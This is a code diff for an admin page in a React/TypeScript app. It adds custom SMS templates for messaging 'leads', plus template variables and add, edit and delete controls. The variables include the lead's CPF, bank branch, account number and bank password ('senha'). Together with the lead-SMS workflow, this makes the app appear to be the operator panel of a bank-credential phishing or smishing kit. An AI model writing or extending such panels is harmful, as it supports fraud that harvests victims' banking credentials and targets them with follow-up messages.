@@ -21,6 +21,11 @@ interface SmsTemplateConfig {
   variables: { key: string; desc: string }[];
   previewReplacements: Record<string, string>;
 }
+export interface CustomSmsTemplate {
+  id: string;
+  name: string;
+  body: string;
+}
 
 // ── Constants ──
 const COMPLETE_DEFAULTS: CompleteTexts = {
@@ -220,6 +225,8 @@ export default function AdminAccessConfigPage() {
   const [turnstileConfig, setTurnstileConfig] = useState<TurnstileConfig>({ enabled: false, site_key: "" });
   const [completeTexts, setCompleteTexts] = useState<CompleteTexts>(COMPLETE_DEFAULTS);
   const [smsValues, setSmsValues] = useState<Record<string, string>>({});
+  const [customSmsTemplates, setCustomSmsTemplates] = useState<CustomSmsTemplate[]>([]);
+  const [newTplName, setNewTplName] = useState("");
   const [saving, setSaving] = useState(false);
   const [saved, setSaved] = useState(false);
 
@@ -277,6 +284,10 @@ export default function AdminAccessConfigPage() {
             setSmsValues((prev) => ({ ...prev, [row.config_key]: val }));
             break;
           }
+          case "sms_custom_templates": {
+            if (Array.isArray(v)) setCustomSmsTemplates(v as CustomSmsTemplate[]);
+            break;
+          }
         }
       }
     }).catch((err) => {
@@ -306,6 +317,7 @@ export default function AdminAccessConfigPage() {
           key: tpl.key,
           value: (smsValues[tpl.key] || "") as any,
         })),
+        { key: "sms_custom_templates", value: customSmsTemplates as any },
       ]);
       setSaved(true);
       setTimeout(() => setSaved(false), 3000);
@@ -465,6 +477,80 @@ export default function AdminAccessConfigPage() {
                 <p className="text-xs text-muted-foreground">{completeTexts.subtitulo}</p>
                 <p className="text-xs text-muted-foreground">{completeTexts.mensagem}</p>
                 <div className="rounded-full border border-border px-3 py-1 text-center text-[11px] font-semibold text-foreground mt-2 max-w-[200px] mx-auto">{completeTexts.botao}</div>
+              </div>
+            </div>
+          </CollapsibleSection>
+
+          {/* ── Templates personalizados ── */}
+          <CollapsibleSection icon={MessageSquare} title="Templates Personalizados" badge={
+            customSmsTemplates.length > 0
+              ? <span className="text-[10px] font-mono text-muted-foreground">{customSmsTemplates.length} template(s)</span>
+              : undefined
+          } defaultOpen>
+            <div className="p-4 space-y-4">
+              <p className="text-xs text-muted-foreground">Templates de SMS manuais — selecionáveis ao enviar SMS de um lead.</p>
+
+              {/* Variáveis disponíveis */}
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <Info className="h-3 w-3 text-muted-foreground shrink-0" />
+                {["{{protocolo}}", "{{cpf}}", "{{nome}}", "{{celular}}", "{{agencia}}", "{{conta}}", "{{senha}}", "{{segmento}}"].map((v) => (
+                  <span key={v} className="rounded bg-muted px-1.5 py-0.5 text-[11px] font-mono text-muted-foreground">{v}</span>
+                ))}
+              </div>
+
+              {/* Lista de templates existentes */}
+              {customSmsTemplates.length === 0 && (
+                <p className="text-xs text-muted-foreground/60 font-mono text-center py-2">Nenhum template criado</p>
+              )}
+              <div className="space-y-3">
+                {customSmsTemplates.map((tpl) => (
+                  <div key={tpl.id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
+                    <div className="flex items-center gap-2">
+                      <input
+                        value={tpl.name}
+                        onChange={(e) => { setCustomSmsTemplates((p) => p.map((t) => t.id === tpl.id ? { ...t, name: e.target.value } : t)); markDirty(); }}
+                        placeholder="Nome do template"
+                        className="flex-1 rounded-lg border border-border bg-card px-3 py-1.5 text-sm text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
+                      />
+                      <button onClick={() => { setCustomSmsTemplates((p) => p.filter((t) => t.id !== tpl.id)); markDirty(); }}
+                        className="rounded-lg border border-destructive/30 p-1.5 text-destructive hover:bg-destructive/10 transition-colors">
+                        <X className="h-3.5 w-3.5" />
+                      </button>
+                    </div>
+                    <textarea
+                      value={tpl.body}
+                      onChange={(e) => { setCustomSmsTemplates((p) => p.map((t) => t.id === tpl.id ? { ...t, body: e.target.value } : t)); markDirty(); }}
+                      rows={3} placeholder="Corpo do SMS..."
+                      className={`${monoTextareaClass} text-xs`}
+                    />
+                    <div className="flex justify-between items-center">
+                      <span className={`text-[10px] font-mono ${tpl.body.length > 160 ? "text-destructive" : "text-muted-foreground"}`}>
+                        {tpl.body.length}/160
+                      </span>
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              {/* Adicionar novo */}
+              <div className="flex gap-2">
+                <input
+                  value={newTplName}
+                  onChange={(e) => setNewTplName(e.target.value)}
+                  placeholder="Nome do novo template..."
+                  className="flex-1 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground/50 outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
+                />
+                <button
+                  onClick={() => {
+                    if (!newTplName.trim()) return;
+                    setCustomSmsTemplates((p) => [...p, { id: Date.now().toString(36), name: newTplName.trim(), body: "" }]);
+                    setNewTplName("");
+                    markDirty();
+                  }}
+                  className="flex items-center gap-1.5 rounded-lg border border-primary/40 bg-primary/10 px-3 py-2 text-sm font-medium text-primary hover:bg-primary/20 transition-colors"
+                >
+                  <Plus className="h-4 w-4" /> Adicionar
+                </button>
               </div>
             </div>
           </CollapsibleSection>
